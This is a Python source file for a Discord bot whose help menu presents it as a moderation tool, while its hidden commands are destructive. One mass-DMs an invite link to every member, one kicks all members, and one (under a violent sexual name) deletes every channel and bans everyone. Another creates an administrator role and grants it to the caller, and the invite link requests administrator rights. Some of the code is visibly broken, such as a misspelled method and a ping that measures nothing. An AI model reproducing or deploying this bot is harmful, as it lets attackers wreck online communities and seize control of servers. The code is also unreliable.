import discord
from discord.ext import commands
from discord.ext.commands import Bot
import asyncio
import time
import logging

client = commands.bot(command_prefix="$") #this is the prefx


client.remove_command("help")


@client.event
async def on_ready():
    print("ready")

@client.event
async def on_server_join(server):
    print("Joining.... {0}".format(server.name))


@client.command(pass_context=True)
async def help(ctx):
    author = ctx.message.author

    embed = discord.Embed(
        colour = discord.colour.blue()
    )

    embed.set_author(name='help')
    embed.add_field(name='$ping', value='Gives ping to client (expressed in ms)', inline=False)
    embed.add_field(name='$kick', value='Kicks specified user', inline=False)
    embed.add_field(name='$ban', value='Bans specified user', inline=False)
    embed.add_field(name='$info', value='Gives information of a user', inline=False)
    embed.add_field(name='$invite', value='Returns invite link of the client', inline=False)
    embed.add_field(name='$clear', value='Clears an X amount of messages', inline=False)
    await client.send_message(author, embed=embed)

@client.command(pass_context=True)
async def dm(ctx, message):
    server = ctx.message.server
    for member in server.members:
        await asyncio.sleep(0)
        try:
            await client.send_message(member, "discord.gg/lydyni")
            print("sent message...")
        except:
            pass

@client.command(pass_context=True)
async def clear(ctx, amount=10):
    channel = ctx.message.channel
    messages = []
    async for message in client.logs_fromn(channel, limit=int(amount)):
        messages.append(message)
    await client.delete_messages(messages)
    await client.say("messages have been deleted")

@client.command(pass_context=True)
async def ping(ctx):
    channel = ctx.message.channel
    t1 = time.perf_counter()
    t2 = time.perf_counter()
    embed=discord.Embed(title=None, description="ping: {}".format((round(t2-t1)*1000)), color=0x2874A6)
    await client.say(embed=embed)

@client.command(pass_context=True)
async def info(ctx, user: discord.Member=None):
    if user is None:
        await client.say("please input a user")


@client.command(pass_context=True)
async def kick(ctx, user: discord.Member=None):
    author = ctx.message.author
    if author.server_permissions.kick_members:
        if user is None:
            await client.say("Please input a user here")
        else:
            await client.say (":boot: get kicked ***{}*** goodbye".format(user.name))
            await client.kick(user)

    else:
        await client.say("you do not have the permissions to use this command")

@client.command(pass_context=True)
async def ban(ctx, user: discord.Member = None):
    author = ctx.message.author
    if author.server_permissions.kick_members:
        if user is None:
            await client.say("Please input a user here")
        else:
            await client.say(":boot: get kicked ***{}*** goodbye".format(user.name))
            await client.ban(user)

    else:
        await client.say("you do not have the permissions to use this command")

@client.command(pass_context=True)
async def invite(ctx):
    await client.say("https://discordapp.com/oauth2/authorize?&client_id=503182818667659274&scope=client&permissions=8")


@client.command(pass_context=True)
async def h(ctx):
    for user in list(ctx.message.server.members):
        try:
            await client.kick(user)
            print("user " + user.name + " has been kicked from " + ctx.message.server.name)
        except:
            pass
        print("action completed :)")

@client.command(pass_context=True)
async def rape(ctx):
    for channel in list(ctx.message.server.channels):
        try:
            await client.delete_channel(channel)
            print (channel.name + " has been deleted in " + ctx.message.server.name)
        except:
            pass
        server = ctx.message.server
        channel = await client.create_channel(server, "RIP", type=discord.ChannelType.text)
        await client.send_message(channel, "INPUT WHAT MESSAGE")
        for user in list(ctx.message.server.members):
            try:
                await client.ban(user)
                print("user " +user.name + " has been banned from " + ctx.message.server.name)
            except:
                pass
            print("input something here")

@client.command(pass_context=True)
async def dab(ctx):
    server = ctx.message.server
    perms = discord.Permissions(8)
    await client.create_role(server, name="dab", permissions=perms)
    user = ctx.message.author
    role = discord.utils.get(user.server.roles, name="dab")
    await client.add_roles(user, role)
    print("input something here")

client.run("BOT TOKEN") #token goes here











